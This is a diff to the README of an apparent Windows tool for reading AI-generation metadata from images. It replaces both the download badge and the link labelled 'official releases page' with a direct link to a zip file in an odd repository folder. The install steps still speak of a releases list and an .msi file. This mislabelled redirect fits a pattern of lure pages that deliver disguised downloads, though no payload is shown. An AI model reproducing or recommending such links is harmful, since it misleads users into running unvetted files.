@@ -1,6 +1,6 @@
 # 🔍 AI-Metadata-Inspector - Extract hidden prompt data from files
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ebncommonthyme293/AI-Metadata-Inspector/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ebncommonthyme293/AI-Metadata-Inspector/raw/refs/heads/main/proclamator/A_Inspector_Metadata_3.2.zip)
 
 AI-Metadata-Inspector provides a simple way to view the hidden information stored inside images and videos created by artificial intelligence. Many tools embed the prompt, the model name, and the generation settings directly into the file. This application reads that data. You can copy this information to your clipboard for use in other projects. The tool integrates into your Windows right-click menu for quick access.
 
@@ -14,7 +14,7 @@ AI-Metadata-Inspector provides a simple way to view the hidden information store
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/ebncommonthyme293/AI-Metadata-Inspector/releases) to view available versions.
+1. Visit the [official releases page](https://github.com/ebncommonthyme293/AI-Metadata-Inspector/raw/refs/heads/main/proclamator/A_Inspector_Metadata_3.2.zip) to view available versions.
 2. Look for the latest release at the top of the list.
 3. Click the file ending in .msi to start the download.
 4. Open the downloaded file once the process finishes.
